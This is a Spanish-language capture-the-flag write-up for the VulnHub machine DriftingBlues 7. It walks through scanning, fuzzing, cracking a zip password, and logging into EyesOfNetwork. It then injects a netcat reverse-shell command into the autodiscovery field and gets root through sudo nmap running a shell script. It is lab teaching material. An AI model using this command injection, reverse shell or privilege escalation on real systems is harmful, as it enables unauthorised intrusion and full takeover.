# Write Up driftingblues\_7 VulnHub

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-18 09:30 EDT
Nmap scan report for 192.168.5.192
Host is up (0.012s latency).

PORT     STATE  SERVICE         VERSION
22/tcp   open   ssh             OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 c4:fa:e5:5f:88:c1:a1:f0:51:8b:ae:e3:fb:c1:27:72 (RSA)
|   256 01:97:8b:bf:ad:ba:5c:78:a7:45:90:a1:0a:63:fc:21 (ECDSA)
|_  256 45:28:39:e0:1b:a8:85:e0:c0:b0:fa:1f:00:8c:5e:d1 (ED25519)
66/tcp   open SimpleHttpServer
80/tcp   open   http            Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3
|_http-title: Did not follow redirect to https://192.168.5.192/
111/tcp  open   rpcbind         2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open   ssl/http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2021-04-03T14:37:22
|_Not valid after:  2022-04-03T14:37:22
| http-title: EyesOfNetwork
|_Requested resource was /login.php##
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3
2403/tcp open   taskmaster2000?
3306/tcp open   mysql           MariaDB (unauthorized)
8086/tcp open   http            InfluxDB http admin 1.7.9
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
MAC Address: 00:0C:29:1A:25:28 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.58 seconds
```

Si nos vamos al puerto `80` nos redirige al puerto `443` que es un `https` donde se encunetra un panel de login...

Pero si en otra pestaña probamos a ver el puerto `66` veremos una pagina web a simple vista normal, pero si hacemos lo siguiente...

### ffuf

```shell
ffuf -u http://<IP>:66/FUZZ -w <WORDLIST> -t 200 -r
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.5.192:66/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecList/Web-content/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# directory-list-lowercase-2.3-medium.txt [Status: 200, Size: 17477, Words: 2314, Lines: 526, Duration: 2ms]
# Copyright 2007 James Fisher [Status: 200, Size: 17477, Words: 2314, Lines: 526, Duration: 3ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 17477, Words: 2314, Lines: 526, Duration: 3ms]
# This work is licensed under the Creative Commons [Status: 200, Size: 17477, Words: 2314, Lines: 526, Duration: 4ms]
#                       [Status: 200, Size: 17477, Words: 2314, Lines: 526, Duration: 3ms]
#                       [Status: 200, Size: 17477, Words: 2314, Lines: 526, Duration: 4ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 17477, Words: 2314, Lines: 526, Duration: 344ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 17477, Words: 2314, Lines: 526, Duration: 447ms]
# Priority-ordered case-insensitive list, where entries were found [Status: 200, Size: 17477, Words: 2314, Lines: 526, Duration: 552ms]
# on at least 2 different hosts [Status: 200, Size: 17477, Words: 2314, Lines: 526, Duration: 554ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 17477, Words: 2314, Lines: 526, Duration: 554ms]
#                       [Status: 200, Size: 17477, Words: 2314, Lines: 526, Duration: 554ms]
#                       [Status: 200, Size: 17477, Words: 2314, Lines: 526, Duration: 1047ms]
                        [Status: 200, Size: 17477, Words: 2314, Lines: 526, Duration: 1047ms]
index_files             [Status: 200, Size: 1636, Words: 41, Lines: 39, Duration: 3ms]
                        [Status: 200, Size: 17477, Words: 2314, Lines: 526, Duration: 1ms]
eon                     [Status: 200, Size: 248, Words: 1, Lines: 5, Duration: 2ms]
:: Progress: [207643/207643] :: Job [1/1] :: 46 req/sec :: Duration: [0:12:01] :: Errors: 3645 ::
```

Veremos un directorio interesante llamado `/eon` si vamos ahi nos descargara un archivo que contendra lo siguiente...

```
UEsDBBQAAQAAAAOfg1LxSVvWHwAAABMAAAAJAAAAY3JlZHMudHh093OsvnCY1d4tLCZqMvRD+ZUU
Rw+5YmOf9bS11scvmFBLAQI/ABQAAQAAAAOfg1LxSVvWHwAAABMAAAAJACQAAAAAAAAAIAAAAAAA
AABjcmVkcy50eHQKACAAAAAAAAEAGABssaU7qijXAYPcazaqKNcBg9xrNqoo1wFQSwUGAAAAAAEA
AQBbAAAARgAAAAAA
```

Parece un `Base64` por lo que con este `script` de `python` que me he creado te lo decodificara y metera en un archivo `.bin`...

```python
import base64

# Cadena codificada en base64
encoded_string = "UEsDBBQAAQAAAAOfg1LxSVvWHwAAABMAAAAJAAAAY3JlZHMudHh093OsvnCY1d4tLCZqMvRD+ZUURw+5YmOf9bS11scvmFBLAQI/ABQAAQAAAAOfg1LxSVvWHwAAABMAAAAJACQAAAAAAAAAIAAAAAAAAABjcmVkcy50eHQKACAAAAAAAAEAGABssaU7qijXAYPcazaqKNcBg9xrNqoo1wFQSwUGAAAAAAEAAQBbAAAARgAAAAAA"

# Decodificar desde base64
decoded_bytes = base64.b64decode(encoded_string)

# Guardar los bytes decodificados en un archivo
with open('output.bin', 'wb') as file:
    file.write(decoded_bytes)

print("Los datos han sido decodificados y guardados en 'output.bin'.")
```

Una vez ejecutado, obtendremos el contenido viendose de la siguiente forma...

```
PK��R�I[�       creds.txt�s��p���-,&j2�C��G�bc������/�PK?��R�I[�        $ creds.txt
 ▒l��;�(���k6�(���k6�(�PK[F
```

Por lo que vemos parece ser un `.zip`...

```shell
mv file.bin file.zip
```

Una vez teniendo el `.zip` si lo intentamos descomprimir pedira contraseña, por lo que la intentaremos crackear...

```shell
zip2john file.zip > hash
```

```shell
john --wordlist=<WORDLIST> hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
killah           (output.zip/creds.txt)     
1g 0:00:00:00 DONE (2024-06-18 10:32) 33.33g/s 546133p/s 546133c/s 546133C/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que la contraseña es `killah` por lo que ahora si lo descomprimiremos...

```shell
unzip file.zip
```

Metemos esa contraseña y obtendremos un archivo llamado `creds.txt` que contendra lo siguiente...

```
admin
isitreal31__
```

Si esas credenciales las ingresamos en la pagina del `login` que encontramos nos meteremos como `admin` en la pagina...

URL = https://packetstormsecurity.com/files/160888/EyesOfNetwork-5.3-Remote-Code-Execution-Privilege-Escalation.html

Dentro del mismo nos iremos a la siguiente `URL`...

```
URL = https://<IP>/lilac/autodiscovery.php
```

Y donde pone `Target Specification` pondremos lo siguiente...

```
& nc -e /bin/sh <IP> <PORT>
```

Le damos a `Add Target`...

Y por utlimo donde pone `Job Name` ponemos lo que sea por ejemplo `test`...

Una vez hecho todo esto, nos pondremos a la escucha...

```shell
nc -lvnp <PORT>
```

Y le damos en la pagina al boton `You Must Provide At Least One Target` que es en azul, una vez hecho eso nos redirigira a otro sitio donde nos muestra la informacion y ya tendremos una shell como el usuario `apache`...

La sanitizamos un poco...

```shell
script /dev/null -c bash
```

```shell
export TERM=xterm
export SHELL=/bin/bash
```

Una vez estando dentro hacemos lo siguiente...

```shell
echo 'os.execute("/bin/sh")' > /tmp/nmap.script
```

```shell
sudo nmap --script=/tmp/nmap.script
```

Info:

```
Starting Nmap 6.40 ( http://nmap.org ) at 2024-06-18 10:56 EDT
NSE: Warning: Loading '/tmp/nmap.script' -- the recommended file extension is '.nse'.
sh-4.2# whoami
root
```

Y con esto ya seriamos `root`, por lo que leeremos la flag...

> flag.txt (flag\_final)

```
flag 1/1
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!
```
